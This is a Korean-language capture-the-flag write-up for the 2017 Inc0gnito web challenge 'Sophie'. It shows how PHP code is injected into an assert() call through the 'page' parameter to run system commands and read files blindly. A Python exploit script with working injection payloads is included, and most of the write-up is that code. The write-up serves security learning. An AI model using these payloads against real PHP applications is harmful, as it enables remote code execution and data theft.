# 2017 Inc0gnito - [WEB] Sophie

## Key words

- php wrapper filtering
- error based blind injection
- key word filtering

## Solution

페이지에 접속하면 `Home`, `Board`, `Contact`가 있지만 문제 풀이와는 별로 상관이 없습니다.

한 가지 눈에 띄는 것은 페이지에 접속하면 `GET`방식으로 `page` 파라미터를 받아 처리하기 때문에 `php://`를 이용하여 페이지를 로드 시켜 `php`코드를 확인해보았습니다.

그런데 다음과 같은 에러가 발생하면서 정상적으로 되질 않습니다.

```
 Warning: assert(): Assertion &quot;strpos('./includes/php://.php', 'php://') === false&quot; failed in /var/www/html/index.php on line 33
```

`php://`를 구하여 `assert`를 하는데, 중간에 제 입력이 들어 가기 때문에 이 부분을 이용하여 `error based injection`을 시도해봅니다.

먼저 우리가 들어 가는 부분은 다음과 같습니다.

```
strpos('./includes/{our input}.php', 'php://') === false
```

`{our input}` 부분에 코드를 인젝션 하여 우리가 원하는 결과를 얻어 보도록 합니다. 먼저 위 비교 문에서 `false`가 발생하면 `assert`가 발생하기 때문에 두 파트로 나눠서 `{TRUE Condition} & {Blind Condition}`으로 생각을 하면 앞 쪽에는 항상 참이고 뒤 쪽은 우리의 결과의 따라서 참과 거짓으로 나뉘기 때문에 `blind`할 수 있습니다.

이를 위해 항상 참이 되는 구문과 조건문을 다음과 같이 만들 수 있습니다. 

```
[1] strpos('./includes/', '1') === false && 
[2] {blind condition} &&
[3] strpos('1
```

`[1]` 은 처음에 항상 참이 되도록 설정하기 위해 넣은 부분이고 `[2]`가 우리의 인젝션이 들어 가는 부분이며 `[3]`은 나머지 코드가 정상적으로 실행되기 위해 넣은 코드 입니다.

먼저 폴더를 검색해보도록 합니다.

`scandir`이 막혀있어서 `system` 명령을 이용하여 폴더를 조사하엿습니다.

```
def get_dir_length(path, n=0):
    for i in range(2048):
        if i < n:
            continue
        print "Len : %d" % i
        s = 'strlen(system("ls -al %s | paste -sd \',\'")) == %d' % (path, i)
        if check(base % s):
            print "Found length %d" % i
            return i

def get_dir_info(path, n):
    length = get_dir_length(path, n)
    s = ""
    while len(s) < length:
        print s
        for c in string.printable:
            tmp = s + c
            payload = 'substr(system("ls -a1 %s | paste -sd \',\'"), 0, %d) == base64_decode("%s")' % (
            path, len(tmp), base64.b64encode(tmp))

            if check(base % payload):
                s += c
```

디렉토리를 조사 해보니 다음과 같은 구주로 되어 있었습니다.

```
.
..
header.php
includes/
  .
  ..
  board.php
  contact.php
  flag.php
  home.php
  index.php
index.php
nav.css
style.css
```

먼저 `flag.php` 를 아무리 넣어봐도 나오질 않아 먼저 `index.php`를 구해보았더니 다음과 같은 `php` 내용이 있었습니다.

```
<?php
    //FLAG is at ./includes/flag.php
    include_once("header.php");
    if(isset($_GET['page'])){
        $page = $_GET['page'];
    }
    else{
        $page = "home";
    }
    if(strpos($page, "..")){
        $page = "home";
    }
    if(strpos($page, "flag")){
        $page = "home";
    }
    $file = "./includes/" . $page. ".php";
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    assert_options(ASSERT_ACTIVE, true);
    assert_options(ASSERT_WARNING, true);
    assert("strpos('$file', 'php://') === false") or die("No php wrapper!");
    @require_once($file);
?>
```

`page` 파라미터에 `flag`가 오게 되면 `home`으로 변경합니다. 따라서, `php.galf` 로 전송하고, 우리의 php 코드에서 `strrev`를 하여 반대로 해주게 되면 `flag.php`를 읽게 될 수 있었고 정상적으로 플래그를 읽을 수 있었습니다.

## Solution Code 

```python
import requests
import string
import base64

url = "http://prob.nagi.moe:9091/index.php"

# strpos('./includes/[php://].php', 'php://') === false
base = "', '1') === false && %s && strpos('1"

def check(payload):
    r = requests.get(url, params={'page':payload})
    return "No php wrapper" not in r.text

def get_len(path, n=0):
    for i in range(2048):
        if i < n:
            continue

        print "Length upto %d" % i
        s = 'strlen(file_get_contents(strrev("%s"))) == %d' % (path, i)
        if check(base % s):
            print "Found Length %d" % i
            return i

def read_file_contents_2(path, n=0, start_at=0):
    if n!= 0 :
        length = n
    else:
        length = get_len(path, n)
    s = ""
    while len(s) < length:
        print len(s), s
        try:
            for c in string.printable:
                tmp = s + c
                payload = 'substr(file_get_contents(strrev("%s")), 0, %d) == base64_decode("%s")' % (
                path, len(tmp), base64.b64encode(tmp))

                if check(base % payload):
                    s += c
        except Exception as e:
            continue

def get_dir_info(path, n):
    length = get_dir_length(path, n)
    s = ""
    while len(s) < length:
        print s
        for c in string.printable:
            tmp = s + c
            payload = 'substr(system("ls -a1 %s | paste -sd \',\'"), 0, %d) == base64_decode("%s")' % (
            path, len(tmp), base64.b64encode(tmp))

            if check(base % payload):
                s += c

def get_dir_length(path, n=0):
    for i in range(2048):
        if i < n:
            continue
        print "Len : %d" % i
        s = 'strlen(system("ls -al %s | paste -sd \',\'")) == %d' % (path, i)
        if check(base % s):
            print "Found length %d" % i
            return i

print read_file_contents_2("./index.php"[::-1], 1524, 0)
```
